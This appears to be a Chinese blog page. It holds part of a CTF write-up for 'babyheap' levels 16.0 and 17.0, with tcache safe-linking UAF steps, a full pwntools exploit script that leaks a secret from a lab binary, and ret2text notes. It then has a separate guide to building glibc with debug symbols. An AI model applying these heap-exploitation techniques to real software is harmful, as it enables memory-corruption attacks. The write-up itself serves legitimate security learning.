<p><strong>假设fake_chunk_mem已经对齐到0x10</strong></p>
<p>0x0.chunk0 &#x3D; malloc(0x10)</p>
<p>0x1.chunk1 &#x3D; malloc(0x10)</p>
<p>0x2.chunk2 &#x3D; malloc(0x10)</p>
<p>0x3.free(chunk1)</p>
<p>0x4.free(chunk2)</p>
<p>0x5.[UAF] chunk2.next &#x3D;  ( 页框号 ) ^ (fake_chunk_mem)</p>
<p>0x6.chunk2 &#x3D; malloc()</p>
<p>0x7.fake_chunk &#x3D; malloc()</p>
<blockquote>
<p>此时fake_chunk.key归零</p>
<p>tcache-&gt;entries[idx] &#x3D; REVEAL_PTR(fake_chunk.next)</p>
</blockquote>
<p>0x8.free(chunk0)</p>
<blockquote>
<p>此时chunk0.next &#x3D; PROTECT_PTR(REVEAL_PTR(fake_chunk.next))</p>
</blockquote>
<p>0x9.[UAF] puts(chunk0.next)</p>
<p>0xA.计算fake_chunk.next</p>
<blockquote>
<p>fake_chunk.next &#x3D; chunk0.next ^ (页框号) ^ (fake_chunk_addr &gt;&gt; 12)</p>
</blockquote>
<p>写个exp意思意思</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># p = process(&#x27;./babyheap_level16.0&#x27;)</span></span><br><span class="line">p = process(<span class="string">&#x27;/challenge/babyheap_level16.0&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">malloc</span>(<span class="params">index,size</span>):</span><br><span class="line">    index = <span class="built_in">str</span>(index).encode()</span><br><span class="line">    size = <span class="built_in">str</span>(size).encode()</span><br><span class="line">    p.sendline(<span class="string">b&#x27;malloc&#x27;</span>)</span><br><span class="line">    p.sendline(index)</span><br><span class="line">    p.sendline(size)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    index = <span class="built_in">str</span>(index).encode()</span><br><span class="line">    p.sendline(<span class="string">b&#x27;free&#x27;</span>)</span><br><span class="line">    p.sendline(index)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">puts</span>(<span class="params">index, size = <span class="number">0</span></span>):</span><br><span class="line">    index = <span class="built_in">str</span>(index).encode() </span><br><span class="line">    p.sendline(<span class="string">b&#x27;puts&#x27;</span>)</span><br><span class="line">    p.sendline(index)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Data: &#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> size == <span class="number">0</span>:</span><br><span class="line">        data = p.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        data = p.recv(size)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scanf</span>(<span class="params">index,content</span>):</span><br><span class="line">    index = <span class="built_in">str</span>(index).encode()</span><br><span class="line">    p.sendline(<span class="string">b&#x27;scanf&#x27;</span>)</span><br><span class="line">    p.sendline(index)</span><br><span class="line">    p.sendline(content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_flag</span>(<span class="params">secret</span>):</span><br><span class="line">    p.sendline(<span class="string">b&#x27;send_flag&#x27;</span>)</span><br><span class="line">    p.sendline(secret)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">addr,size = <span class="number">0x10</span></span>):		//addr must be aligned to <span class="number">0x10</span></span><br><span class="line">    malloc(<span class="number">3</span>,size)</span><br><span class="line">    malloc(<span class="number">1</span>,size)</span><br><span class="line">    malloc(<span class="number">2</span>,size)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    chunk1_next = puts(<span class="number">1</span>)</span><br><span class="line">    chunk2_next = puts(<span class="number">2</span>)</span><br><span class="line">    chunk1_next = <span class="built_in">int</span>.from_bytes(chunk1_next, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    chunk2_next = <span class="built_in">int</span>.from_bytes(chunk2_next, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(chunk1_next))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;chunk2_next previously = &quot;</span>,<span class="built_in">hex</span>(chunk2_next))</span><br><span class="line">    chunk2_next = chunk1_next ^ addr</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;chunk2_next now = &quot;</span>,<span class="built_in">hex</span>(chunk2_next))</span><br><span class="line">    scanf(<span class="number">2</span>,p64(chunk2_next))</span><br><span class="line"></span><br><span class="line">    malloc(<span class="number">2</span>,size)</span><br><span class="line">    malloc(<span class="number">1</span>,size)    </span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    chunk3_next = puts(<span class="number">3</span>,<span class="number">8</span>)</span><br><span class="line">    chunk3_next = <span class="built_in">int</span>.from_bytes(chunk3_next, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    ep = chunk1_next ^ chunk3_next</span><br><span class="line">    data = (addr &gt;&gt; <span class="number">12</span>) ^ ep</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">    </span><br><span class="line">secret_addr = <span class="number">0x433050</span></span><br><span class="line">malloc(<span class="number">9</span>,<span class="number">0x20</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line">page_num = puts(<span class="number">9</span>)</span><br><span class="line">page_num = <span class="built_in">int</span>.from_bytes(page_num, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(page_num))</span><br><span class="line"></span><br><span class="line">data = leak(secret_addr,<span class="number">0x10</span>)		//secret_addr = <span class="number">0x433050</span> <span class="keyword">is</span> aligned to <span class="number">0x10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(data))</span><br><span class="line">data = data.to_bytes(<span class="number">8</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line"></span><br><span class="line">payload = data + p64(<span class="number">0</span>) </span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"></span><br><span class="line">send_flag(payload)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h3 id="level17-0"><a href="#level17-0" class="headerlink" title="level17.0"></a>level17.0</h3><p>ret2text</p>
<p>利用堆UAF将返回地址放到堆块上</p>
<p>调试发现返回地址都对齐到0x8</p>
<p>不满足堆块对齐到0x10的要求</p>
<p>因此假堆块可以在返回地址-0x8,-0x18等处</p>
<p>但是还有高手</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">v3 = malloc_usable_size(chunks[index_2]);</span><br><span class="line"><span class="built_in">sprintf</span>(input, <span class="string">&quot;%%%us&quot;</span>, v3);</span><br><span class="line">v4 = malloc_usable_size(chunks[index_2]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] scanf(\&quot;%%%us\&quot;, allocations[%d])\n&quot;</span>, v4, index_2);</span><br><span class="line"><span class="built_in">scanf</span>(input, chunks[index_2]);</span><br></pre></td></tr></table></figure>

<p>在往假堆块写入之前,还有一个库函数<code>malloc_usable_size</code>调用,这位更是重量级,他会调用<code>musable</code></p>
<p>这位更是重中之重量级</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">size_t</span></span><br><span class="line"><span class="title function_">musable</span><span class="params">(<span class="type">void</span> *mem)</span></span><br><span class="line">&#123;</span><br><span class="line">    mchunkptr p = mem2chunk(mem);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (chunk_is_mmapped(p))</span><br><span class="line">        <span class="keyword">return</span> chunksize(p) - CHUNK_HDR_SZ;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (inuse(p))</span><br><span class="line">        <span class="keyword">return</span> memsize(p);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果<code>p</code>没有<code>Mmap (2)</code>标志位,会调用<code>inuse(p)</code>这个函数会查看<strong>下一个</strong>堆块的<code>Prev_in_use (1)</code>标志位来判定<strong>当前</strong>堆块是否使用</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> inuse(p)							      \</span></span><br><span class="line"><span class="meta">  ((((mchunkptr) (((char *) (p)) + chunksize (p)))-&gt;mchunk_size) &amp; PREV_INUSE)</span></span><br></pre></td></tr></table></figure>

<p>找下一个堆块的依据是本堆块的<code>size</code>,</p>
<p>也就是说<code>p + p.size</code>就偏移到了下一个堆块</p>
<p>问题就来了,本堆块的<code>size</code>是不能确定的,本堆块是一个假堆块,很可能是一个非常大的数</p>
<p>导致<code>p+p.size</code>指向非法内存区域,导致<code>(p + p.size)-&gt;size </code>解引用失败,导致程序崩溃</p>
<p>现在考虑我们可能的受害者返回地址</p>
<p>main ret2 libc_start_main</p>
<p>libc_start_main ret2 start</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2024/10/17/%E8%B0%83%E8%AF%95Glibc/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/10/17/%E8%B0%83%E8%AF%95Glibc/" class="post-title-link" itemprop="url">glibc 相关备忘</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2024-10-17 23:20:00 / Modified: 23:25:26" itemprop="dateCreated datePublished" datetime="2024-10-17T23:20:00+08:00">2024-10-17</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="源码调试Glibc"><a href="#源码调试Glibc" class="headerlink" title="源码调试Glibc"></a>源码调试Glibc</h1><h2 id="系统自带glibc的缺点"><a href="#系统自带glibc的缺点" class="headerlink" title="系统自带glibc的缺点"></a>系统自带glibc的缺点</h2><p>在我们尝试观察延迟绑定机制时,</p>
<p>需要观察_dl_runtime_resolve和dl_fixup这两个函数</p>
<p>这两个函数都位于ld-linux.so.2 动态库中</p>
<p>默认情况下使用gcc编译程序时,动态链接的glibc动态库文件,都在&#x2F;lib下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/usr/src/CTF-All-In-One/src/writeup/<span class="number">6.1</span><span class="number">.3</span>_pwn_xdctf2015_pwn200<span class="meta"># ldd /bin/cat</span></span><br><span class="line">        linux-vdso.so<span class="number">.1</span> (<span class="number">0x00007fffee15a000</span>)</span><br><span class="line">        libc.so<span class="number">.6</span> =&gt; /lib/x86_64-linux-gnu/libc.so<span class="number">.6</span> (<span class="number">0x00007f36b527b000</span>)</span><br><span class="line">        /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span> (<span class="number">0x00007f36b5875000</span>)</span><br><span class="line">root@Destroyer:/usr/src/CTF-All-In-One/src/writeup/<span class="number">6.1</span><span class="number">.3</span>_pwn_xdctf2015_pwn200<span class="meta"># ldd ./test</span></span><br><span class="line">        linux-gate.so<span class="number">.1</span> (<span class="number">0xf7f33000</span>)</span><br><span class="line">        libc.so<span class="number">.6</span> =&gt; /lib/i386-linux-gnu/libc.so<span class="number">.6</span> (<span class="number">0xf7d3b000</span>)</span><br><span class="line">        /lib/ld-linux.so<span class="number">.2</span> (<span class="number">0xf7f35000</span>)</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th></th>
<th>libc</th>
<th>ld</th>
</tr>
</thead>
<tbody><tr>
<td>32位程序</td>
<td>&#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc.so.6</td>
<td>&#x2F;lib&#x2F;ld-linux.so.2</td>
</tr>
<tr>
<td>64位程序</td>
<td>&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6</td>
<td>&#x2F;lib64&#x2F;ld-linux-x86-64.so.2</td>
</tr>
</tbody></table>
<p>这是安装ubuntu这种发行版时系统自带的glibc-release版</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/lib/i386-linux-gnu<span class="meta"># file ld-2.27.so</span></span><br><span class="line">ld<span class="number">-2.27</span>.so: ELF <span class="number">32</span>-bit LSB shared object, Intel <span class="number">80386</span>, version <span class="number">1</span> (SYSV), dynamically linked, BuildID[sha1]=<span class="number">8</span>da666988713e9bb88f4eb5d27dc35d815cf006b, stripped</span><br></pre></td></tr></table></figure>

<p>可以看到调试符号信息已经被strip了</p>
<p>就算我们编译一个c程序时加入了-g选项,也只是保留了程序领空内的所有符号信息,该程序链接的glibc照样是没有调试符号的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gef➤  info sharedlibrary</span><br><span class="line">From        To          Syms Read   Shared Object Library</span><br><span class="line"><span class="number">0xf7fd6ab0</span>  <span class="number">0xf7ff18bb</span>  Yes (*)     /lib/ld-linux.so<span class="number">.2</span></span><br><span class="line"><span class="number">0xf7df4690</span>  <span class="number">0xf7f414b6</span>  Yes (*)     /lib/i386-linux-gnu/libc.so<span class="number">.6</span></span><br><span class="line">(*): Shared library is missing debugging information.</span><br></pre></td></tr></table></figure>

<p>两个库都标着*,意思是缺乏调试信息</p>
<p>如果我们想要调试glibc,或者说能够保留glibc中的符号,比如函数名,变量名之类,需要带有符号的glibc</p>
<p>可以自己编译一个玩</p>
<p>以我的wsl kali-linux为例,装机自带的libc版本号是2.38</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(dustball㉿Destroyer)-[~]</span><br><span class="line">└─$ ldd --version</span><br><span class="line"><span class="title function_">ldd</span> <span class="params">(Debian GLIBC <span class="number">2.38</span><span class="number">-13</span>)</span> 2.38</span><br><span class="line"><span class="title function_">Copyright</span> <span class="params">(C)</span> 2023 Free Software Foundation, Inc.</span><br><span class="line">This is <span class="built_in">free</span> software; see the source <span class="keyword">for</span> copying conditions.  There is NO</span><br><span class="line">warranty; not even <span class="keyword">for</span> MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</span><br><span class="line">Written by Roland McGrath and Ulrich Drepper.</span><br></pre></td></tr></table></figure>

<p>下面我们编译一个新的带有调试符号的2.38版本的glibc</p>
<h2 id="编译64位glibc"><a href="#编译64位glibc" class="headerlink" title="编译64位glibc"></a>编译64位glibc</h2><h3 id="下载glibc"><a href="#下载glibc" class="headerlink" title="下载glibc"></a>下载glibc</h3><p>首先下载glibc源码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install glibc-source</span><br></pre></td></tr></table></figure>

<p>执行完后会在&#x2F;usr&#x2F;src下面生成glibc目录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Destroyer)-[/usr/src/glibc]</span><br><span class="line">└─# ls</span><br><span class="line">debian  glibc-2.38.tar.xz</span><br></pre></td></tr></table></figure>

<blockquote>
<p>这个方法不太靠谱，我在另一台机器的wsl上这样整，缺少texinfo源代码</p>
<p>还是到仓库下载源代码稳妥</p>
</blockquote>
<p>或者到glibc仓库<a target="_blank" rel="noopener" href="http://ftp.gnu.org/gnu/glibc/">http://ftp.gnu.org/gnu/glibc/</a>挑一个下载</p>
<p>或者到镜像仓库下载<a target="_blank" rel="noopener" href="https://mirrors.aliyun.com/gnu/glibc/">https://mirrors.aliyun.com/gnu/glibc/</a></p>
<p>比如</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://ftp.gnu.org/gnu/glibc/glibc-2.38.tar.xz -o glibc-2.38.tar.xz</span><br></pre></td></tr></table></figure>

<h3 id="解压glibc"><a href="#解压glibc" class="headerlink" title="解压glibc"></a>解压glibc</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -xf glibc<span class="number">-2.38</span>.tar.xz</span><br></pre></td></tr></table></figure>

<h3 id="建立bulid目录"><a href="#建立bulid目录" class="headerlink" title="建立bulid目录"></a>建立bulid目录</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd glibc-2.38</span><br><span class="line">mkdir build</span><br><span class="line">cd build</span><br></pre></td></tr></table></figure>

<h3 id="配置编译选项"><a href="#配置编译选项" class="headerlink" title="配置编译选项"></a>配置编译选项</h3><p>在build路径下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../configure --prefix=/home/glibc/ --enable-add-ons=nptl --with-tls --with-__thread --enable-kernel=2.6.32 --enable-debug --disable-werror </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../configure --prefix=/home/glibc32/glibc-2.38 --enable-add-ons=nptl --with-tls --with-__thread --enable-kernel=2.6.32 --enable-debug --disable-werror </span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../configure --prefix=/home/dustball/glibc/glibc-2.35 --enable-add-ons=nptl --with-tls --with-__thread --enable-kernel=2.6.32 --enable-debug --disable-werror</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../configure --prefix=/home/dustball/glibc/glibc-2.27 --enable-add-ons=nptl --with-tls --with-__thread --enable-kernel=2.6.32 --enable-debug --disable-werror</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../configure --prefix=/home/dustball/glibc/glibc-2.31 --enable-add-ons=nptl --with-tls --with-__thread --enable-kernel=2.6.32 --enable-debug --disable-werror</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../configure --prefix=/home/dustball/glibc/glibc-2.35 --enable-add-ons=nptl --with-tls --with-__thread --enable-kernel=2.6.32 --enable-debug --disable-werror</span><br></pre></td></tr></table></figure>







<p>这里<code>--prefix=/home/glibc</code>是决定<code>make install</code>的安装地址</p>
<p><code>–-enable-debug</code>允许调试,实际上就是给gcc传递-g编译选项</p>
<h3 id="编译-安装"><a href="#编译-安装" class="headerlink" title="编译&amp;安装"></a>编译&amp;安装</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make -j `nproc`</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>

<blockquote>
<p>如果配置编译选项时prefix没有写或者写错了也没关系</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make install DESTDIR=/home/glibc/</span><br></pre></td></tr></table></figure>

<p>这样安装也可以</p>
</blockquote>
<p>如果编译和安装都没有错误,会在<code>/home/glibc/</code>下生成我们的货</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Destroyer)-[/home/glibc]</span><br><span class="line">└─<span class="meta"># ls</span></span><br><span class="line">bin  etc  include  lib  libexec  sbin  share  var</span><br></pre></td></tr></table></figure>

<p>动态库在lib下面放着了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Destroyer)-[/home/glibc/lib]</span><br><span class="line">└─<span class="meta"># file libc.so.6</span></span><br><span class="line">libc.so<span class="number">.6</span>: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (GNU/Linux), dynamically linked, interpreter /home/glibc/lib/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=a8ebdd4a75fecb70ba9fe1dc5765fcd87c77742e, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, with debug_info, not stripped</span><br></pre></td></tr></table></figure>

<p>非常滴漂亮</p>
<h2 id="交叉编译32位glibc-可选"><a href="#交叉编译32位glibc-可选" class="headerlink" title="交叉编译32位glibc(可选)"></a>交叉编译32位glibc(可选)</h2><p>在x86_64 linux上,也兼容32位的程序</p>
<p>如果想要32位带符号glibc的支持,需要再编译一个32位的glibc</p>
<p>下载和解压不用做了,还是利用之前编译64位glibc时的源码即可</p>
<h3 id="建立build32目录"><a href="#建立build32目录" class="headerlink" title="建立build32目录"></a>建立build32目录</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd glibc<span class="number">-2.38</span></span><br><span class="line">mkdir build32</span><br><span class="line">cd build32</span><br></pre></td></tr></table></figure>

<h3 id="配置32位编译选项"><a href="#配置32位编译选项" class="headerlink" title="配置32位编译选项"></a>配置32位编译选项</h3><p>首先让gcc能够编译32位程序,需要安装一些依赖</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install build-essential module-assistant gcc-multilib g++-multilib </span><br></pre></td></tr></table></figure>

<p>然后配置编译选项</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../configure --prefix=/home/glibc32 --host=i686-pc-linux-gnu --enable-add-ons=nptl --with-tls --with-__thread --enable-kernel=2.6.32 --with-binutils=/usr/bin --with-headers=/usr/include --build=i686-linux-gnu CC=&quot;gcc -m32&quot; CXX=&quot;g++ -m32&quot;</span><br></pre></td></tr></table></figure>

<h3 id="编译-安装-1"><a href="#编译-安装-1" class="headerlink" title="编译&amp;安装"></a>编译&amp;安装</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make -j`nproc`</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>

<p>如果编译安装都没有错误,会在&#x2F;home&#x2F;glibc32下面生成我们的货</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Destroyer)-[/home]</span><br><span class="line">└─# ls</span><br><span class="line">dustball  glibc  glibc32</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Destroyer)-[/home/glibc32/lib]</span><br><span class="line">└─<span class="meta"># file libc.so.6</span></span><br><span class="line">libc.so<span class="number">.6</span>: ELF <span class="number">32</span>-bit LSB shared object, Intel <span class="number">80386</span>, version <span class="number">1</span> (GNU/Linux), dynamically linked, interpreter /lib/ld-linux.so<span class="number">.2</span>, BuildID[sha1]=<span class="number">3</span>d4a2e7c0e16c8cc778b5bd574a59eb4988e2d96, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, with debug_info, not stripped</span><br></pre></td></tr></table></figure>

<p>漂亮滴很</p>
<h2 id="编译链接glibc"><a href="#编译链接glibc" class="headerlink" title="编译链接glibc"></a>编译链接glibc</h2><p>现在系统里面有两个glibc</p>
<p>一个系统自带的没有调试符号的glibc在&#x2F;lib下面</p>
<p>一个我们自己编译的有调试符号的glibc在&#x2F;home&#x2F;glibc下面</p>
<p>但是天无二日,程序只能链接一个glibc,并且程序默认链接到&#x2F;lib下的老太阳</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Destroyer)-[/home/glibc-test]</span><br><span class="line">└─<span class="meta"># ldd main</span></span><br><span class="line">        linux-vdso.so<span class="number">.1</span> (<span class="number">0x00007fff451fb000</span>)</span><br><span class="line">        libc.so<span class="number">.6</span> =&gt; /lib/x86_64-linux-gnu/libc.so<span class="number">.6</span> (<span class="number">0x00007f93106d0000</span>)</span><br><span class="line">        /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span> (<span class="number">0x00007f93108c0000</span>)</span><br></pre></td></tr></table></figure>

<p>如何让程序链接到我们自己编译的glibc呢?</p>
<p>gcc有一个编译选项可以指定链接libc的位置</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc main.c -o main -Wl,--rpath=/home/glibc/lib -Wl,--dynamic-linker=/home/glibc/lib/ld-linux-x86-64.so.2   -I/home/glibc/include -g -no-pie</span><br></pre></td></tr></table></figure>

<p><code>-Wl,--rpath=/home/glibc/lib</code>指定glibc路径</p>
<p><code>-Wl,--dynamic-linker=/home/glibc/lib/ld-linux-x86-64.so.2</code>指定动态链接器的路径</p>
<p><code>-I/home/glibc/include</code>指定头文件路径</p>
